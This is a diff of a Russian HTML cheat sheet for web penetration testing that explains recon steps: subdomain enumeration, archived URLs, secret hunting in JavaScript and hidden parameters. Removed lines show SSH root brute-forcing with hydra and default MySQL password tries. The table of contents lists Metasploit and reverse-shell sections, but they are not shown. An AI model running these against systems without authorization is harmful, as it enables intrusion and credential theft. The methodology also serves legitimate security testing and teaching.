@@ -2,610 +2,1132 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Схема веб-теста · с объяснениями</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Веб-тест: полная методология</title>
 <style>
-  :root {
+  :root{
     --bg:#0f0f10; --panel:#1a1a1d; --panel2:#222226; --border:#2e2e33;
     --text:#ececec; --dim:#8e8e96; --accent:#10a37f; --accent-soft:#0d2b24;
     --red:#ef4444; --orange:#f0a34a; --purple:#a78bfa; --blue:#6aa8ff;
-    --notes-w:340px;
+    --notes-w:340px; --toc-w:250px;
   }
-  * { box-sizing:border-box; }
-  body {
+  *{box-sizing:border-box}
+  body{
     font-family:'Söhne','Segoe UI',system-ui,sans-serif;
-    background:var(--bg); color:var(--text); margin:0; line-height:1.6;
-    padding:24px calc(var(--notes-w) + 40px) 60px 16px;
-    transition:padding-right .25s ease;
+    background:var(--bg); color:var(--text); margin:0; line-height:1.62;
+    padding:24px calc(var(--notes-w) + 40px) 80px calc(var(--toc-w) + 24px);
+    transition:padding .25s ease;
   }
-  body.notes-hidden { padding-right:16px; }
+  body.notes-hidden{padding-right:24px}
+  body.toc-hidden{padding-left:24px}
 
-  h1 { text-align:center; font-weight:600; font-size:22px; margin:0 0 4px; }
-  h1 span { color:var(--accent); }
-  .sub { text-align:center; color:var(--dim); font-size:13px; margin-bottom:22px; }
+  /* ═════ ОГЛАВЛЕНИЕ ═════ */
+  #toc{
+    position:fixed; top:0; left:0; width:var(--toc-w); height:100vh;
+    background:var(--panel); border-right:1px solid var(--border);
+    overflow-y:auto; padding:18px 14px 40px; z-index:90;
+    transition:transform .25s ease; font-size:13px;
+  }
+  #toc.hidden{transform:translateX(-100%)}
+  #toc h3{margin:0 0 12px; font-size:12px; letter-spacing:1.2px;
+          text-transform:uppercase; color:var(--dim); font-weight:600}
+  #toc a{display:block; color:var(--dim); text-decoration:none; padding:5px 8px;
+         border-radius:7px; margin-bottom:2px; transition:all .12s}
+  #toc a:hover{background:var(--panel2); color:var(--accent)}
+  #toc a.ph{color:var(--accent); font-weight:600; margin-top:10px}
+  #tocToggle{
+    position:fixed; top:16px; left:calc(var(--toc-w) + 14px); z-index:91;
+    background:var(--panel); border:1px solid var(--border); color:var(--accent);
+    border-radius:10px; padding:8px 13px; font-size:13px; cursor:pointer;
+    transition:left .25s ease;
+  }
+  #tocToggle.hidden{left:14px}
 
-  /* ══ Поле цели ══ */
-  #targetBar {
-    max-width:900px; margin:0 auto 26px; background:var(--panel);
+  h1{text-align:center; font-weight:600; font-size:23px; margin:0 0 4px}
+  h1 span{color:var(--accent)}
+  .sub{text-align:center; color:var(--dim); font-size:13px; margin-bottom:24px}
+
+  /* ═════ ВВОД ДАННЫХ ═════ */
+  #inputs{
+    max-width:900px; margin:0 auto 28px; background:var(--panel);
     border:1px solid var(--border); border-radius:14px; padding:14px 18px;
-    display:flex; gap:10px; flex-wrap:wrap; align-items:center;
+    display:flex; gap:12px; flex-wrap:wrap;
   }
-  #targetBar label { color:var(--dim); font-size:13px; }
-  #targetInput {
-    flex:1; min-width:220px; background:var(--bg); color:var(--accent);
-    border:1px solid var(--border); border-radius:10px; padding:9px 14px;
-    font-family:'JetBrains Mono',Consolas,monospace; font-size:13.5px; outline:none;
+  .field{display:flex; flex-direction:column; gap:5px; flex:1; min-width:200px}
+  .field label{font-size:11.5px; color:var(--dim); letter-spacing:.5px}
+  .field input{
+    background:var(--bg); color:var(--accent); border:1px solid var(--border);
+    border-radius:9px; padding:9px 13px; outline:none;
+    font-family:'JetBrains Mono',Consolas,monospace; font-size:13.5px;
   }
-  #targetInput:focus { border-color:var(--accent); }
+  .field input:focus{border-color:var(--accent)}
+  .btn-apply{
+    background:var(--accent); color:#fff; border:none; border-radius:9px;
+    padding:0 20px; font-weight:600; font-size:13.5px; cursor:pointer;
+    align-self:flex-end; height:37px;
+  }
+  .btn-apply:hover{background:#0d8a6c}
 
-  .step {
+  /* ═════ ФАЗЫ ═════ */
+  .phase{
+    max-width:900px; margin:0 auto 14px; padding:14px 22px;
+    background:linear-gradient(90deg,var(--accent-soft),transparent);
+    border-left:4px solid var(--accent); border-radius:10px;
+  }
+  .phase h2{margin:0; font-size:17px; font-weight:600; color:var(--accent)}
+  .phase p{margin:5px 0 0; font-size:13px; color:var(--dim)}
+
+  .step{
     background:var(--panel); border:1px solid var(--border); border-radius:16px;
-    padding:22px 24px; margin:0 auto 18px; max-width:900px;
+    padding:22px 24px; margin:0 auto 16px; max-width:900px;
     box-shadow:0 1px 3px rgba(0,0,0,.4);
   }
-  .step h2 {
-    font-size:16px; font-weight:600; margin:0 0 6px;
+  .step h3{
+    font-size:15.5px; font-weight:600; margin:0 0 6px;
     display:flex; align-items:center; gap:10px; flex-wrap:wrap;
   }
-  .badge {
-    background:var(--accent-soft); color:var(--accent);
-    border:1px solid var(--accent); border-radius:20px;
-    padding:2px 10px; font-size:11px; font-weight:600; white-space:nowrap;
+  .num{
+    background:var(--accent-soft); color:var(--accent); border:1px solid var(--accent);
+    border-radius:20px; padding:1px 10px; font-size:11px; font-weight:600; white-space:nowrap;
   }
-  /* короткое «зачем» под заголовком */
-  .why { color:var(--dim); font-size:13.5px; margin:0 0 12px; }
+  .why{color:var(--dim); font-size:13.4px; margin:0 0 12px}
 
-  code { background:var(--panel2); color:#6ee7b7; padding:2px 7px; border-radius:6px;
-         font-family:'JetBrains Mono',Consolas,monospace; font-size:13px; }
-  pre { background:var(--panel2); color:#d8f5e9; padding:14px 16px; border-radius:10px;
-        border:1px solid var(--border); font-family:'JetBrains Mono',Consolas,monospace;
-        font-size:13px; line-height:1.65; overflow-x:auto; white-space:pre-wrap; }
-
-  /* ══ Объяснение ══ */
-  .explain {
-    background:var(--panel2); border-left:3px solid var(--blue);
-    border-radius:8px; margin:12px 0; padding:0;
+  code{background:var(--panel2); color:#6ee7b7; padding:2px 7px; border-radius:6px;
+       font-family:'JetBrains Mono',Consolas,monospace; font-size:12.8px}
+  pre{
+    background:var(--panel2); color:#d8f5e9; padding:14px 16px; border-radius:10px;
+    border:1px solid var(--border); font-family:'JetBrains Mono',Consolas,monospace;
+    font-size:12.8px; line-height:1.62; overflow-x:auto; white-space:pre-wrap;
+    cursor:pointer; position:relative; transition:border-color .15s;
   }
-  .explain > summary {
-    cursor:pointer; padding:11px 15px; font-size:13.5px; color:var(--blue);
-    font-weight:600; list-style:none; user-select:none;
+  pre:hover{border-color:var(--accent)}
+  pre::after{
+    content:'копировать'; position:absolute; top:6px; right:10px; font-size:10.5px;
+    color:var(--dim); opacity:0; transition:opacity .15s;
   }
-  .explain > summary::-webkit-details-marker { display:none; }
-  .explain > summary::before { content:'▸ '; }
-  .explain[open] > summary::before { content:'▾ '; }
-  .explain > summary:hover { color:#9cc4ff; }
-  .explain .body { padding:0 16px 14px; font-size:13.8px; color:#c8ccd4; }
-  .explain .body p { margin:8px 0; }
-  .explain .body ul { margin:8px 0 8px 4px; padding-left:18px; }
-  .explain .body li { margin:5px 0; }
-  .explain .body b { color:var(--text); }
-  .explain .body .k { color:var(--purple); font-family:'JetBrains Mono',monospace; font-size:12.8px; }
-  .explain .body .v { color:var(--orange); }
+  pre:hover::after{opacity:1}
+  pre.copied::after{content:'✓ скопировано'; color:var(--accent); opacity:1}
 
-  .branch { color:var(--dim); font-size:12.5px; margin:16px 0 6px;
-            text-transform:uppercase; letter-spacing:1px; }
-  button {
+  /* ═════ ОБЪЯСНЕНИЯ ═════ */
+  .explain{background:var(--panel2); border-left:3px solid var(--blue);
+           border-radius:8px; margin:12px 0; padding:0}
+  .explain>summary{cursor:pointer; padding:11px 15px; font-size:13.4px;
+                   color:var(--blue); font-weight:600; list-style:none; user-select:none}
+  .explain>summary::-webkit-details-marker{display:none}
+  .explain>summary::before{content:'▸ '}
+  .explain[open]>summary::before{content:'▾ '}
+  .explain>summary:hover{color:#9cc4ff}
+  .explain .body{padding:0 16px 14px; font-size:13.6px; color:#c8ccd4}
+  .explain .body p{margin:8px 0}
+  .explain .body ul{margin:8px 0 8px 4px; padding-left:18px}
+  .explain .body li{margin:5px 0}
+  .explain .body b{color:var(--text)}
+  .k{color:var(--purple); font-family:'JetBrains Mono',monospace; font-size:12.6px}
+  .v{color:var(--orange)}
+  .flag{color:var(--purple)}
+  .vuln{color:var(--orange); font-weight:600}
+
+  /* ═════ РАЗВИЛКИ ═════ */
+  .branch{color:var(--dim); font-size:12.3px; margin:16px 0 6px;
+          text-transform:uppercase; letter-spacing:1px}
+  button{
     background:var(--panel2); color:var(--text); border:1px solid var(--border);
-    padding:8px 16px; margin:5px 6px 5px 0; border-radius:10px; cursor:pointer;
-    font-size:13.5px; transition:all .15s;
+    padding:8px 15px; margin:5px 6px 5px 0; border-radius:10px; cursor:pointer;
+    font-size:13.2px; transition:all .15s; text-align:left;
   }
-  button:hover { border-color:var(--accent); color:var(--accent); }
-  button.red:hover { border-color:var(--red); color:var(--red); }
-  .next { display:none; margin-top:12px; padding:14px 16px; background:var(--panel2);
-          border:1px solid var(--accent); border-radius:10px; font-size:14px;
-          line-height:1.7; animation:fade .25s ease; }
-  @keyframes fade { from{opacity:0;transform:translateY(4px);} to{opacity:1;} }
-  .msf { border-color:var(--red); background:#1f1416; }
-  .msf h3 { color:var(--red); font-size:14px; margin:0 0 10px; }
-  .flag { color:var(--purple); }
-  .vuln { color:var(--orange); font-weight:600; }
-  .arrow { text-align:center; color:var(--dim); font-size:18px; margin:4px 0 14px; }
-  table { width:100%; border-collapse:collapse; font-size:13.5px; margin:10px 0; }
-  td,th { border:1px solid var(--border); padding:8px 12px; text-align:left; }
-  th { background:var(--panel2); color:var(--accent); font-weight:600; }
-  td b { color:var(--accent); }
-  .go { background:var(--accent); color:#fff; border:none; font-weight:600; }
-  .go:hover { background:#0d8a6c; color:#fff; }
+  button:hover{border-color:var(--accent); color:var(--accent)}
+  button.red:hover{border-color:var(--red); color:var(--red)}
+  .next{display:none; margin-top:10px; padding:13px 16px; background:var(--panel2);
+        border:1px solid var(--accent); border-radius:10px; font-size:13.6px;
+        line-height:1.68; animation:fade .22s ease}
+  @keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1}}
+  .msf{border-color:var(--red); background:#1f1416}
+  .msf strong{color:var(--red)}
+  .go{background:transparent; border:1px solid var(--accent); color:var(--accent); font-weight:600}
+  .go:hover{background:var(--accent-soft)}
 
-  /* ══ Заметки ══ */
-  #notes {
-    position:fixed; top:0; right:0; width:var(--notes-w); height:100vh;
-    background:var(--panel); border-left:1px solid var(--border);
-    display:flex; flex-direction:column; z-index:100; transition:transform .25s ease;
-  }
-  #notes.hidden { transform:translateX(100%); }
-  #notes header { padding:16px 18px 12px; border-bottom:1px solid var(--border);
-                  display:flex; align-items:center; justify-content:space-between; }
-  #notes header h2 { margin:0; font-size:14px; font-weight:600;
-                     display:flex; align-items:center; gap:8px; }
-  #notes header h2::before { content:'📝'; }
-  #notes textarea {
+  table{width:100%; border-collapse:collapse; font-size:13.2px; margin:10px 0}
+  td,th{border:1px solid var(--border); padding:8px 11px; text-align:left; vertical-align:top}
+  th{background:var(--panel2); color:var(--accent); font-weight:600; font-size:12.5px}
+  td b{color:var(--accent)}
+
+  .arrow{text-align:center; color:var(--dim); font-size:16px; margin:2px 0 12px}
+  .warn{background:#241a12; border-left:3px solid var(--orange); border-radius:8px;
+        padding:10px 14px; font-size:13.4px; margin:12px 0; color:#e8d3bc}
+  .tip{background:var(--accent-soft); border-left:3px solid var(--accent); border-radius:8px;
+       padding:10px 14px; font-size:13.4px; margin:12px 0; color:#c9efe3}
+
+  /* ═════ ЗАМЕТКИ ═════ */
+  #notes{position:fixed; top:0; right:0; width:var(--notes-w); height:100vh;
+         background:var(--panel); border-left:1px solid var(--border);
+         display:flex; flex-direction:column; z-index:100; transition:transform .25s ease}
+  #notes.hidden{transform:translateX(100%)}
+  #notes header{padding:16px 18px 12px; border-bottom:1px solid var(--border);
+                display:flex; align-items:center; justify-content:space-between}
+  #notes header h2{margin:0; font-size:14px; font-weight:600;
+                   display:flex; align-items:center; gap:8px}
+  #notes header h2::before{content:'📝'}
+  #notes textarea{
     flex:1; width:100%; resize:none; border:none; outline:none;
     background:var(--bg); color:var(--text);
-    font-family:'JetBrains Mono',Consolas,monospace; font-size:13px;
-    line-height:1.75; padding:16px 18px; border-bottom:1px solid var(--border);
+    font-family:'JetBrains Mono',Consolas,monospace; font-size:12.8px;
+    line-height:1.75; padding:16px 18px; border-bottom:1px solid var(--border)
   }
-  #notes textarea::placeholder { color:#5a5a62; }
-  #notes footer { padding:12px 14px; display:flex; flex-wrap:wrap; gap:8px;
-                  border-top:1px solid var(--border); align-items:center; }
-  #notes footer button { margin:0; padding:7px 12px; font-size:12.5px; }
-  #savedHint { font-size:11.5px; color:var(--accent); margin-left:auto;
-               opacity:0; transition:opacity .25s; }
-  #savedHint.show { opacity:1; }
-  #notesToggle {
-    position:fixed; top:16px; right:calc(var(--notes-w) + 16px); z-index:101;
-    background:var(--panel); border:1px solid var(--border); color:var(--accent);
-    border-radius:10px; padding:8px 14px; font-size:13px; cursor:pointer;
-    transition:right .25s ease, background .15s;
-  }
-  #notesToggle:hover { background:var(--panel2); }
-  #notesToggle.hidden { right:16px; }
+  #notes textarea::placeholder{color:#5a5a62}
+  #notes footer{padding:12px 14px; display:flex; flex-wrap:wrap; gap:8px;
+                border-top:1px solid var(--border); align-items:center}
+  #notes footer button{margin:0; padding:7px 11px; font-size:12.3px}
+  #savedHint{font-size:11.3px; color:var(--accent); margin-left:auto;
+             opacity:0; transition:opacity .25s}
+  #savedHint.show{opacity:1}
+  #notesToggle{position:fixed; top:16px; right:calc(var(--notes-w) + 16px); z-index:101;
+               background:var(--panel); border:1px solid var(--border); color:var(--accent);
+               border-radius:10px; padding:8px 14px; font-size:13px; cursor:pointer;
+               transition:right .25s ease}
+  #notesToggle:hover{background:var(--panel2)}
+  #notesToggle.hidden{right:16px}
 
-  @media (max-width:760px) {
-    body { padding-right:16px; }
-    #notes { width:100%; height:55vh; top:auto; bottom:0; border-left:none;
-             border-top:1px solid var(--border); border-radius:16px 16px 0 0; }
-    #notes.hidden { transform:translateY(100%); }
-    #notesToggle { right:16px; bottom:16px; top:auto; }
+  @media(max-width:1100px){
+    body{padding-left:24px; padding-right:24px}
+    #toc{transform:translateX(-100%)}
+    #toc.open{transform:translateX(0)}
+    #tocToggle{left:14px}
+    body.notes-hidden{padding-right:24px}
+    #notes{width:100%; height:55vh; top:auto; bottom:0; border-left:none;
+           border-top:1px solid var(--border); border-radius:16px 16px 0 0}
+    #notes.hidden{transform:translateY(100%)}
+    #notesToggle{right:14px; bottom:14px; top:auto}
   }
 </style>
 </head>
 <body>
 
-<h1>🎯 <span>СХЕМА ВЕБ-ТЕСТА</span></h1>
-<div class="sub">Любой сайт · шаги с объяснениями · заметки справа</div>
+<!-- ═════ ОГЛАВЛЕНИЕ ═════ -->
+<button id="tocToggle" onclick="document.getElementById('toc').classList.toggle('open')">☰ Фазы</button>
+<nav id="toc">
+  <h3>Фазы теста</h3>
+  <a href="#p0" class="ph">Фаза 0 · Подготовка</a>
+  <a href="#s0">— Проверка инструментов</a>
+  <a href="#p1" class="ph">Фаза 1 · Пассивная разведка</a>
+  <a href="#s1">— Субдомены</a>
+  <a href="#s2">— Живые хосты</a>
+  <a href="#s3">— История URL</a>
+  <a href="#s4">— JavaScript</a>
+  <a href="#s5">— Скрытые параметры</a>
+  <a href="#p2" class="ph">Фаза 2 · Активная разведка</a>
+  <a href="#s6">— Порты</a>
+  <a href="#s7">— WAF</a>
+  <a href="#s8">— Технологии</a>
+  <a href="#s9">— Виртуальные хосты</a>
+  <a href="#s10">— Слабые места (nikto)</a>
+  <a href="#s11">— Скрытые пути (ffuf)</a>
+  <a href="#s12">— Шаблоны CVE (nuclei)</a>
+  <a href="#p3" class="ph">Фаза 3 · Карта приложения</a>
+  <a href="#s13">— Burp sitemap + роли</a>
+  <a href="#p4" class="ph">Фаза 4 · Ручное тестирование</a>
+  <a href="#s14">— IDOR / доступ</a>
+  <a href="#s15">— Аутентификация и JWT</a>
+  <a href="#s16">— Бизнес-логика</a>
+  <a href="#s17">— Инъекции</a>
+  <a href="#s18">— XSS</a>
+  <a href="#s19">— SSRF / перенаправления</a>
+  <a href="#s20">— Загрузка файлов</a>
+  <a href="#s21">— Гонки (race)</a>
+  <a href="#s22">— GraphQL / CORS</a>
+  <a href="#p5" class="ph">Фаза 5 · Эксплуатация</a>
+  <a href="#s23">— sqlmap</a>
+  <a href="#s24">— Metasploit</a>
+  <a href="#p6" class="ph">Фаза 6 · После доступа</a>
+  <a href="#s25">— Обратный шелл</a>
+  <a href="#s26">— Повышение прав</a>
+  <a href="#p7" class="ph">Фаза 7 · Отчёт</a>
+  <a href="#s27">— Структура отчёта</a>
+  <a href="#extra" class="ph">Справочники</a>
+  <a href="#chains">— Цепочки багов</a>
+  <a href="#flags">— Шпаргалка флагов</a>
+  <a href="#anti">— Анти-паттерны</a>
+  <a href="#src">— Источники</a>
+</nav>
 
-<div id="targetBar">
-  <label for="targetInput">Цель:</label>
-  <input id="targetInput" type="text" value="example.com"
-         placeholder="example.com или https://example.com" spellcheck="false">
-  <button onclick="applyTarget()">Применить</button>
+<h1>🎯 <span>ПОЛНАЯ МЕТОДОЛОГИЯ ВЕБ-ТЕСТА</span></h1>
+<div class="sub">8 фаз · от пассивной разведки до отчёта · с объяснением каждого шага</div>
+
+<div id="inputs">
+  <div class="field">
+    <label>ЦЕЛЬ (домен)</label>
+    <input id="inTarget" value="example.com" spellcheck="false">
+  </div>
+  <div class="field">
+    <label>IP ЦЕЛИ (для эксплойтов)</label>
+    <input id="inIp" value="IP_ЦЕЛИ" spellcheck="false">
+  </div>
+  <div class="field">
+    <label>ТВОЙ IP (для шелла)</label>
+    <input id="inLhost" value="ТВОЙ_IP" spellcheck="false">
+  </div>
+  <button class="btn-apply" onclick="applyInputs()">Применить</button>
 </div>
 
-<!-- ═══ ШАГ 1 ═══ -->
-<div class="step">
-<h2><span class="badge">Шаг 1</span> Сайт живой?</h2>
-<p class="why">Проверяем, что сайт вообще открывается снаружи. Если нет — остальное бессмысленно.</p>
-<pre>curl -I https://TARGET</pre>
-
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p><b>curl</b> — программа, которая «дёргает» страницу и показывает, что ответил сервер.
-<span class="k">-I</span> — попросить только служебные заголовки, без самой страницы: быстро и не грузит сайт.</p>
-<p><b>Что смотреть</b> — первую строку ответа:</p>
-<ul>
-<li><span class="v">200 OK</span> — страница есть, всё нормально</li>
-<li><span class="v">301 / 302</span> — страница переехала на другой адрес, тоже нормально</li>
-<li><span class="v">403</span> — сервер говорит «не пущу», но он живой</li>
-<li><span class="v">000</span> — ответа не было: нет такого домена или сервер лежит</li>
-</ul>
+<!-- ═════ ФАЗА 0 ═════ -->
+<div class="phase" id="p0">
+  <h2>Фаза 0 · Подготовка</h2>
+  <p>Прежде чем идти в разведку — убедись, что инструменты стоят и данные не потеряются.</p>
 </div>
-</details>
 
-<div class="branch">Развилки:</div>
-<button onclick="show('n1a')">200 / 301 / 302</button>
-<div class="next" id="n1a">→ сайт живой → Шаг 2</div>
-<button onclick="show('n1b')">403</button>
-<div class="next" id="n1b">→ доступ «мягко» закрыт, но сервер жив → всё равно Шаг 2</div>
-<button onclick="show('n1c')">000 / Could not resolve</button>
-<div class="next" id="n1c">→ СТОП. Домен не существует или опечатка в адресе.</div>
-<br><button class="go" onclick="go('step2')">Шаг 2 →</button>
+<div class="step" id="s0">
+  <h3><span class="num">0.1</span> Проверка инструментов</h3>
+  <p class="why">Нет смысла строить конвейер на программах, которых нет в системе.</p>
+<pre>which nmap nikto gobuster ffuf nuclei sqlmap whatweb wafw00f hydra \
+      subfinder httpx katana gau waybackurls arjun dalfox burpsuite
+
+sudo apt install -y nmap nikto gobuster ffuf sqlmap whatweb wafw00f hydra</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>which</b> — «где лежит программа». Пустой вывод = программа не установлена.</p>
+  <p>Часть инструментов ставится через <span class="k">go install</span> (ProjectDiscovery: subfinder, httpx, katana, nuclei). Если их нет — ставь po отдельности:</p>
+  <ul>
+  <li><span class="k">go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</span></li>
+  <li><span class="k">pip install arjun</span> — скрытые параметры</li>
+  </ul>
+  <p><b>Правило:</b> если инструмент не читаешь и не понимаешь — не ставь. «Синдром коллекционера тулзов» — одна из главных ловушек новичков: 50 программ в системе и ни одной прочитанной находки.</p>
+  </div>
+  </details>
 </div>
-<div class="arrow">▼</div>
 
-<!-- ═══ ШАГ 2 ═══ -->
-<div class="step" id="step2">
-<h2><span class="badge">Шаг 2</span> Какие порты открыты</h2>
-<p class="why">Порты — это «двери» сервера. Веб обычно на 80/443, но рядом часто открыто что-то попроще.</p>
-<pre>nmap -sV -sC -T4 --top-ports 1000 TARGET</pre>
-
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p><b>nmap</b> — сканер: стучится в порты и сообщает, какие открыты и что за ними стоит.</p>
-<ul>
-<li><span class="k">--top-ports 1000</span> — проверить 1000 самых популярных портов (быстро); <span class="k">-p-</span> — все 65535 (долго)</li>
-<li><span class="k">-sV</span> (Version) — не просто «дверь открыта», а какая программа и какой версии</li>
-<li><span class="k">-sC</span> — запустить готовые проверочные скрипты</li>
-<li><span class="k">-T</span> (Timing) — скорость: <b>0</b>=очень тихо, <b>2</b>=вежливо, <b>4</b>=быстро, <b>5</b>=максимально быстро (и заметно)</li>
-</ul>
-<p><b>Что смотреть:</b> строки со словом <span class="v">open</span> — это открытые двери.</p>
+<!-- ═════ ФАЗА 1 ═════ -->
+<div class="phase" id="p1">
+  <h2>Фаза 1 · Пассивная разведка</h2>
+  <p>Не касаемся цели вообще — спрашиваем про неё у чужих баз данных. Тише, безопаснее, а находок часто больше.</p>
 </div>
-</details>
 
-<div class="branch">Развилки по выводу:</div>
-<button onclick="show('n2a')">80 / 443 (веб)</button>
-<div class="next" id="n2a">→ Шаг 3 (обычный веб-путь)</div>
-<button onclick="show('n2b')">22 (SSH)</button>
-<div class="next" id="n2b">→ ветка SSH: <code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://TARGET</code></div>
-<button onclick="show('n2c')">21 (FTP)</button>
-<div class="next" id="n2c">→ <code>ftp TARGET</code>, логин <code>anonymous</code>, пароль пустой</div>
-<button onclick="show('n2d')">3306 (MySQL)</button>
-<div class="next" id="n2d">→ <code>mysql -h TARGET -u root -p</code> (пробуй пустой пароль, root, toor)</div>
-<button onclick="show('n2e')">8080 / 8000 / 8443 / 9000</button>
-<div class="next" id="n2e">→ открой <code>http://TARGET:8080</code> в браузере — часто там панель управления</div>
-<button onclick="show('n2f')">Пусто (все closed/filtered)</button>
-<div class="next" id="n2f">→ СТОП. Сайт за фильтром или на другом IP.</div>
-<br><button class="go" onclick="go('step3')">Шаг 3 →</button>
+<div class="step" id="s1">
+  <h3><span class="num">1.1</span> Субдомены</h3>
+  <p class="why">Один забытый dev-поддомен может стоить дороже, чем весь основной сайт.</p>
+<pre>subfinder -d TARGET -all -recursive -silent -o subs.txt
+assetfinder --subs-only TARGET | anew subs.txt
+curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r '.[].name_value' | sort -u >> subs.txt
+amass enum -passive -d TARGET -o subs_amass.txt
+cat subs*.txt | sort -u > subs_all.txt</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p>Субдомены — это <code>dev.сайт</code>, <code>api.сайт</code>, <code>admin.сайт</code>. Они не всегда видны на главной странице.</p>
+  <ul>
+  <li><span class="k">-d</span> — домен · <span class="k">-all</span> — все источники данных · <span class="k">-recursive</span> — искать субдомены субдоменов</li>
+  <li><span class="k">-silent</span> — только результат, без баннеров</li>
+  <li><b>crt.sh</b> — база выданных TLS-сертификатов. Каждый сертификат публичен, и там виден список доменов (SAN)</li>
+  <li><span class="k">anew</span> — дописывает в файл только строки, которых там ещё нет</li>
+  <li><b>amass -passive</b> — тяжёлый, зато перебирает десятки баз</li>
+  </ul>
+  <p><b>Что искать в списке:</b> имена со словами <code>dev, staging, test, old, beta, internal, admin, api, vpn</code>.</p>
+  </div>
+  </details>
 </div>
-<div class="arrow">▼</div>
 
-<!-- ═══ ШАГ 3 ═══ -->
-<div class="step" id="step3">
-<h2><span class="badge">Шаг 3</span> Есть защита WAF?</h2>
-<p class="why">WAF — «охранник», который распознаёт атаки и банит. От его наличия зависит, насколько громко можно сканировать.</p>
+<div class="step" id="s2">
+  <h3><span class="num">1.2</span> Что из этого живо</h3>
+  <p class="why">Из 2000 субдоменов реально работают 100. Работать будем только с живыми.</p>
+<pre>httpx -l subs_all.txt -silent -status-code -title -tech-detect \
+      -follow-redirects -threads 100 -o live.txt</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">-status-code</span> — HTTP-код ответа</li>
+  <li><span class="k">-title</span> — заголовок страницы (по нему видно «Login», «Admin», «phpMyAdmin»)</li>
+  <li><span class="k">-tech-detect</span> — определяет технологии (nginx, PHP, WordPress, Spring…)</li>
+  <li><span class="k">-threads 100</span> — сколько хостов проверять одновременно</li>
+  </ul>
+  <p><b>Что искать:</b> в <code>live.txt</code> — строки с <code>login</code>, <code>admin</code>, <code>swagger</code>, <code>api</code>, <code>jenkins</code>, <code>grafana</code>, а также нестандартные стеки.</p>
+  <p><b>Важно:</b> не смотри на 10 000 строк. Выбери 5 самых интересных — это и есть «modern recon».</p>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s3">
+  <h3><span class="num">1.3</span> Исторические URL (архивы интернета)</h3>
+  <p class="why">Сайт мог иметь страницы, которые давно удалили. Архивы их помнят — и там часто остаются скрытые эндпоинты.</p>
+<pre>echo TARGET | waybackurls | anew urls.txt
+cat live.txt | awk '{print $1}' | gau | anew urls.txt
+katana -list live.txt -d 3 -jc -silent -o urls_katana.txt
+cat urls_katana.txt | anew urls.txt
+grep -vE '\.(png|jpg|jpeg|gif|css|woff|svg|ico|ttf)$' urls.txt | sort -u > urls_clean.txt</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><b>waybackurls / gau</b> — вытаскивают URL из archive.org, Common Crawl, AlienVault, URLScan. Никакого касания цели</li>
+  <li><b>katana</b> — активный краулер: ходит по сайту как браузер. <span class="k">-jc</span> — разбирать JavaScript, <span class="k">-d 3</span> — глубина 3 клика</li>
+  <li><b>grep -vE</b> — выбросить картинки и стили, оставить только страницы и API</li>
+  </ul>
+  <p><b>Что искать:</b> <code>?id=</code>, <code>?token=</code>, <code>/api/v1/</code>, <code>.json</code>, <code>.php?</code> — любой параметр в историческом URL = потенциальная точка входа.</p>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s4">
+  <h3><span class="num">1.4</span> JavaScript — главный клад</h3>
+  <p class="why">Современные приложения выкладывают всю логику в JS-файлы. Там видны API-эндпоинты, которых нет в меню, и иногда ключи.</p>
+<pre>grep -E '\.js(\?|$)' urls_clean.txt | sort -u > js.txt
+mkdir -p js && cd js
+cat ../js.txt | xargs -P 20 -I{} wget -q {}
+
+# эндпоинты внутри JS
+for f in *.js; do python3 LinkFinder.py -i "$f" -o cli; done | sort -u > endpoints.txt
+
+# секреты
+for f in *.js; do python3 SecretFinder.py -i "$f" -o cli; done
+trufflehog filesystem ./js</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><b>LinkFinder</b> — ищет внутри JS строки, похожие на пути: <code>/api/users/list</code></li>
+  <li><b>SecretFinder</b> — ищет ключи: AWS (<code>AKIA…</code>), Google (<code>AIza…</code>), Stripe (<code>sk_live_…</code>), Firebase, SendGrid</li>
+  <li><b>trufflehog</b> — проверяет найденные ключи на «живость», отсекая фальшивки</li>
+  </ul>
+  <p><b>Что искать ещё:</b> <code>enabled</code>, <code>beta</code>, <code>experimental</code>, <code>feature_flag</code> — выключенные фичи, к которым нет кнопки, но есть API.</p>
+  <div class="warn">Найденный ключ — это не баг. Проверь, что он реально даёт доступ. Публичный ключ Stripe (<code>pk_live_</code>) — норма, секретный (<code>sk_live_</code>) — критично.</div>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s5">
+  <h3><span class="num">1.5</span> Скрытые параметры</h3>
+  <p class="why">У эндпоинта могут быть параметры, которых нет ни в форме, ни в ссылке. Они часто и есть незащищённый вход.</p>
+<pre>arjun -u "https://TARGET/api/user" -m GET,POST --stable -o params.json</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>arjun</b> отправляет много запросов с разными именами параметров и смотрит, меняется ли ответ. Если меняется — параметр существует.</p>
+  <ul>
+  <li><span class="k">-m GET,POST</span> — проверять и в адресе, и в теле</li>
+  <li><span class="k">--stable</span> — меньше ложных срабатываний</li>
+  </ul>
+  <p>Альтернативы: <b>x8</b> (быстрее, на Rust), <b>ParamSpider</b> (берёт имена параметров из архивов).</p>
+  <p><b>Что делать с найденным:</b> прогони каждый параметр через Шаг 4 (XSS/инъекции) и Шаг IDOR — скрытые параметры почти всегда без проверок.</p>
+  </div>
+  </details>
+</div>
+
+<!-- ═════ ФАЗА 2 ═════ -->
+<div class="phase" id="p2">
+  <h2>Фаза 2 · Активная разведка</h2>
+  <p>Теперь стучимся в цель. Здесь важно не «спалить» себя и не уронить сайт.</p>
+</div>
+
